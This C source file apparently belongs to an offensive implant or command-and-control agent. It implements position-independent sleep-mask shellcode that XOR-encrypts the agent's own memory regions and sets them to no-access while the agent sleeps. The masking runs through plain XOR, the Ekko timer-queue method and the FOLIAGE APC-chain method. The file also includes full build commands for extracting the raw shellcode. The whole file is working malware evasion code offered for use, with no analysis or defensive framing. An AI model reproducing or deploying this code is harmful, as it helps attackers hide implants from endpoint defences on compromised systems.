/*
 * evasion_pic.c — Position-Independent sleep mask shellcode.
 *
 * This file is compiled to raw x86-64 machine code and loaded into an
 * anonymous VirtualAlloc RX page at runtime by evasion_init().  All five
 * sleep mask modes (0-4) are present; the active mode is selected at runtime
 * via SleepMaskCtx.mode, which evasion.c sets from AGENT_SLEEP_MASK_MODE.
 *
 * Build (offline, produces evasion_pic_bytes.h):
 *
 *   x86_64-w64-mingw32-gcc -O1 -nostdlib \
 *     -fno-asynchronous-unwind-tables -fno-stack-protector \
 *     -fno-stack-check -fno-ident -mno-stack-arg-probe \
 *     -Wall -Wno-unused-function \
 *     -c evasion_pic.c -o evasion_pic.o
 *
 *   x86_64-w64-mingw32-gcc -O1 -nostdlib \
 *     -fno-asynchronous-unwind-tables -fno-stack-protector \
 *     -fno-stack-check -fno-ident -mno-stack-arg-probe \
 *     -Wl,--entry=pic_fill_exports,--subsystem=windows,--no-seh \
 *     evasion_pic.o -o evasion_pic.exe
 *
 *   x86_64-w64-mingw32-objcopy --only-section=.text -O binary \
 *     evasion_pic.exe evasion_pic.bin
 *
 *   xxd -i evasion_pic.bin > evasion_pic_bytes.h
 *
 * STRICT PIC RULES — never violate any of these:
 *   1. No global or static-local variables.  All state lives in SleepMaskCtx*.
 *   2. No string literals.  They go to .rodata, not .text.
 *   3. No direct API calls.  Every Windows function is called through a
 *      function pointer in ctx so there are no IAT thunks in this code.
 *   4. pic_fill_exports() MUST be the first function in this file so that it
 *      lands at byte-offset 0 of the extracted .text blob.  evasion.c calls
 *      it as  ((fill_fn_t)alloc_base)(&ctx)  before use.
 */

#include "evasion_pic_ctx.h"

/* Windows protection constants (defined locally — no windows.h) */
#define W_PAGE_NOACCESS          0x01u
#define W_PAGE_READWRITE         0x04u
#define W_PAGE_EXECUTE_READ      0x20u
#define W_PAGE_EXECUTE_READWRITE 0x40u
#define W_WT_EXECUTEINTIMERTHREAD 0x20u
#define W_WAIT_OBJECT_0          0u
#define W_THREAD_ALL_ACCESS      0x1FFFFFu
#define W_CREATE_SUSPENDED       0x00000001u

/* ─── forward declarations ─────────────────────────────────────────────── */
static void    sleep_mask_entry(SleepMaskCtx *ctx);
static void    pic_plain_sleep(SleepMaskCtx *ctx);
static void    pic_xor_regions(SleepMaskCtx *ctx);
static void    pic_noaccess_lock(SleepMaskCtx *ctx, pic_u32 *saved);
static void    pic_noaccess_unlock(SleepMaskCtx *ctx, pic_u32 *saved);
static void    pic_emergency_decrypt(SleepMaskCtx *ctx);
static void    pic_ekko_encrypt_cb(void *param, pic_i32 unused);
static void    pic_ekko_decrypt_cb(void *param, pic_i32 unused);
static void    pic_foliage_encrypt_apc(void *param, void *a2, void *a3);
static void    pic_foliage_sleep_apc(void *param, void *a2, void *a3);
static void    pic_foliage_decrypt_apc(void *param, void *a2, void *a3);
static pic_u32 pic_foliage_thread_entry(void *param);

/* ═══════════════════════════════════════════════════════════════════════════
 * pic_fill_exports — MUST BE THE FIRST FUNCTION (offset 0 of .text blob).
 *
 * evasion.c calls this immediately after copying the shellcode and marking
 * it PAGE_EXECUTE_READ.  It uses RIP-relative LEA internally (valid because
 * all callee addresses are within the same .text section that was copied).
 * After this call, ctx->fn_sleep_mask_entry is the main dispatch entry point.
 *
 * section(".text") with no $ suffix — PE linker places plain .text before
 * all .text$funcname sections so this function lands at byte offset 0.
 * ═══════════════════════════════════════════════════════════════════════════ */
__attribute__((section(".text")))
void pic_fill_exports(SleepMaskCtx *ctx)
{
    ctx->fn_sleep_mask_entry = (void *)sleep_mask_entry;
    ctx->fn_ekko_encrypt     = (void *)pic_ekko_encrypt_cb;
    ctx->fn_ekko_decrypt     = (void *)pic_ekko_decrypt_cb;
    ctx->fn_foliage_encrypt  = (void *)pic_foliage_encrypt_apc;
    ctx->fn_foliage_sleep    = (void *)pic_foliage_sleep_apc;
    ctx->fn_foliage_decrypt  = (void *)pic_foliage_decrypt_apc;
    ctx->fn_foliage_thread   = (void *)pic_foliage_thread_entry;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * sleep_mask_entry — main dispatcher.  Called via g_pic_sleep(ctx).
 * Reads ctx->mode and ctx->ms that evasion.c sets before each call.
 * ═══════════════════════════════════════════════════════════════════════════ */
static __attribute__((noinline)) void sleep_mask_entry(SleepMaskCtx *ctx)
{
    switch (ctx->mode) {

    /* ── Mode 1: XOR only ─────────────────────────────────────────────── */
    case 1:
        if (ctx->region_count > 0)
            pic_xor_regions(ctx);
        pic_plain_sleep(ctx);
        if (ctx->region_count > 0)
            pic_xor_regions(ctx);
        break;

    /* ── Mode 2: XOR + PAGE_NOACCESS ──────────────────────────────────── */
    case 2:
        if (ctx->region_count == 0 || ctx->conn_thread_count > 0) {
            pic_plain_sleep(ctx);
            break;
        }
        {
            pic_u32 saved[PIC_MAX_REGIONS];
            pic_noaccess_lock(ctx, saved);
            pic_plain_sleep(ctx);
            pic_noaccess_unlock(ctx, saved);
        }
        break;

    /* ── Mode 3: Ekko (timer-queue callbacks) ─────────────────────────── */
    case 3:
        if (!ctx->NtDelay || !ctx->CreateEventA || !ctx->SetEvent ||
            !ctx->CloseH || !ctx->CreateTimerQueue ||
            !ctx->CreateTimerQueueTimer || !ctx->DeleteTimerQueueEx ||
            !ctx->WaitForSingleObject ||
            ctx->region_count == 0 || ctx->conn_thread_count > 0)
        {
            pic_plain_sleep(ctx);
            break;
        }
        ctx->encrypted = 0;
        ctx->event = ctx->CreateEventA((void *)0, 0, 0, (const char *)0);
        if (!ctx->event) { pic_plain_sleep(ctx); break; }

        {
            void *hQ = ctx->CreateTimerQueue();
            if (!hQ) {
                ctx->CloseH(ctx->event);
                ctx->event = (void *)0;
                pic_plain_sleep(ctx);
                break;
            }

            void *hT1 = (void *)0, *hT2 = (void *)0;
            ctx->CreateTimerQueueTimer(&hT1, hQ,
                ctx->fn_ekko_encrypt, (void *)ctx,
                0u, 0u, W_WT_EXECUTEINTIMERTHREAD);
            ctx->CreateTimerQueueTimer(&hT2, hQ,
                ctx->fn_ekko_decrypt, (void *)ctx,
                ctx->ms, 0u, W_WT_EXECUTEINTIMERTHREAD);

            pic_u32 wrc = ctx->WaitForSingleObject(ctx->event,
                                                    ctx->ms + 10000u);
            ctx->DeleteTimerQueueEx(hQ, (void *)(pic_i64)-1);

            if (wrc != W_WAIT_OBJECT_0 && ctx->encrypted)
                pic_emergency_decrypt(ctx);
        }

        ctx->CloseH(ctx->event);
        ctx->event = (void *)0;
        break;

    /* ── Mode 4: FOLIAGE (APC chain on suspended thread) ─────────────── */
    case 4:
        if (!ctx->NtDelay || !ctx->CreateEventA || !ctx->SetEvent ||
            !ctx->CloseH || !ctx->WaitForSingleObject ||
            !ctx->NtCreateThreadEx || !ctx->NtQueueApcThread ||
            !ctx->NtAlertResumeThread || !ctx->NtTestAlert ||
            ctx->region_count == 0 || ctx->conn_thread_count > 0)
        {
            pic_plain_sleep(ctx);
            break;
        }
        ctx->encrypted = 0;
        ctx->event = ctx->CreateEventA((void *)0, 0, 0, (const char *)0);
        if (!ctx->event) { pic_plain_sleep(ctx); break; }

        {
            void *hThread = (void *)0;
            pic_i64 status = ctx->NtCreateThreadEx(
                &hThread,
                (pic_u64)W_THREAD_ALL_ACCESS,
                (void *)0,
                (void *)(pic_i64)-1,     /* current process */
                ctx->fn_foliage_thread,  /* start addr */
                (void *)ctx,             /* param = ctx */
                (pic_u64)W_CREATE_SUSPENDED,
                (pic_u64)0, (pic_u64)0, (pic_u64)0,
                (void *)0);

            if (status != 0 || !hThread) {
                ctx->CloseH(ctx->event);
                ctx->event = (void *)0;
                pic_plain_sleep(ctx);
                break;
            }

            ctx->NtQueueApcThread(hThread, ctx->fn_foliage_encrypt,
                                   (void *)ctx, (void *)0, (void *)0);
            ctx->NtQueueApcThread(hThread, ctx->fn_foliage_sleep,
                                   (void *)ctx, (void *)0, (void *)0);
            ctx->NtQueueApcThread(hThread, ctx->fn_foliage_decrypt,
                                   (void *)ctx, (void *)0, (void *)0);
            ctx->NtAlertResumeThread(hThread, (pic_u32 *)0);

            pic_u32 wrc = ctx->WaitForSingleObject(ctx->event,
                                                    ctx->ms + 15000u);
            ctx->CloseH(hThread);

            if (wrc != W_WAIT_OBJECT_0 && ctx->encrypted)
                pic_emergency_decrypt(ctx);
        }

        ctx->CloseH(ctx->event);
        ctx->event = (void *)0;
        break;

    /* ── Mode 0 (default): no masking — plain NtDelayExecution ───────── */
    default:
        pic_plain_sleep(ctx);
        break;
    }
}

/* ─── Internal helpers ──────────────────────────────────────────────────── */

static __attribute__((noinline)) void pic_plain_sleep(SleepMaskCtx *ctx)
{
    pic_i64 t = -(pic_i64)ctx->ms * 10000LL;
    ctx->NtDelay(0, &t);
}

/* XOR all registered regions (toggle encrypt/decrypt) */
static __attribute__((noinline)) void pic_xor_regions(SleepMaskCtx *ctx)
{
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old))
            if (!ctx->VProt(p, sz, W_PAGE_READWRITE, &old)) continue;
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, old, &old);
    }
}

/* XOR + NOACCESS; saves original protections into caller-supplied array */
static __attribute__((noinline)) void pic_noaccess_lock(SleepMaskCtx *ctx,
                                                         pic_u32 *saved)
{
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        saved[i] = W_PAGE_EXECUTE_READ;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old)) continue;
        saved[i] = old;
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_NOACCESS, &old);
    }
}

/* XOR + restore saved protections */
static __attribute__((noinline)) void pic_noaccess_unlock(SleepMaskCtx *ctx,
                                                           pic_u32 *saved)
{
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old))
            ctx->VProt(p, sz, W_PAGE_READWRITE, &old);
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, saved[i], &old);
    }
}

/* Emergency decrypt — called when WaitForSingleObject times out and the
 * regions are still encrypted (timer/APC decrypt never fired). */
static __attribute__((noinline)) void pic_emergency_decrypt(SleepMaskCtx *ctx)
{
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old))
            ctx->VProt(p, sz, W_PAGE_READWRITE, &old);
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_EXECUTE_READ, &old);
    }
}

/* ─── Ekko timer callbacks ──────────────────────────────────────────────── */

/* Called by timer thread at t=0: XOR + NOACCESS */
static __attribute__((noinline)) void pic_ekko_encrypt_cb(void *param,
                                                           pic_i32 unused)
{
    (void)unused;
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old)) continue;
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_NOACCESS, &old);
    }
    ctx->encrypted = 1;
}

/* Called by timer thread at t=ms: XOR + restore RX, then signal event */
static __attribute__((noinline)) void pic_ekko_decrypt_cb(void *param,
                                                           pic_i32 unused)
{
    (void)unused;
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old))
            ctx->VProt(p, sz, W_PAGE_READWRITE, &old);
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_EXECUTE_READ, &old);
    }
    ctx->encrypted = 0;
    ctx->SetEvent(ctx->event);
}

/* ─── FOLIAGE APC chain ─────────────────────────────────────────────────── */

/* APC 1: encrypt */
static __attribute__((noinline)) void pic_foliage_encrypt_apc(void *param,
                                                               void *a2,
                                                               void *a3)
{
    (void)a2; (void)a3;
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old)) continue;
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_NOACCESS, &old);
    }
    ctx->encrypted = 1;
}

/* APC 2: sleep (NtDelayExecution — non-alertable to avoid recursive APCs) */
static __attribute__((noinline)) void pic_foliage_sleep_apc(void *param,
                                                              void *a2,
                                                              void *a3)
{
    (void)a2; (void)a3;
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    pic_i64 t = -(pic_i64)ctx->ms * 10000LL;
    ctx->NtDelay(0, &t);
}

/* APC 3: decrypt + signal main thread */
static __attribute__((noinline)) void pic_foliage_decrypt_apc(void *param,
                                                               void *a2,
                                                               void *a3)
{
    (void)a2; (void)a3;
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    for (pic_i32 i = 0; i < ctx->region_count; i++) {
        pic_u8  *p  = (pic_u8 *)ctx->regions[i].base;
        pic_u64  sz = ctx->regions[i].sz;
        if (!p || !sz || !ctx->VProt) continue;
        pic_u32 old = 0;
        if (!ctx->VProt(p, sz, W_PAGE_EXECUTE_READWRITE, &old))
            ctx->VProt(p, sz, W_PAGE_READWRITE, &old);
        for (pic_u64 j = 0; j < sz; j++) p[j] ^= PIC_XOR_KEY;
        ctx->VProt(p, sz, W_PAGE_EXECUTE_READ, &old);
    }
    ctx->encrypted = 0;
    ctx->SetEvent(ctx->event);
}

/* Thread entry: drain the queued APC chain (encrypt → sleep → decrypt) */
static __attribute__((noinline)) pic_u32 pic_foliage_thread_entry(void *param)
{
    SleepMaskCtx *ctx = (SleepMaskCtx *)param;
    ctx->NtTestAlert();   /* become alertable once → drains all 3 queued APCs */
    return 0;
}
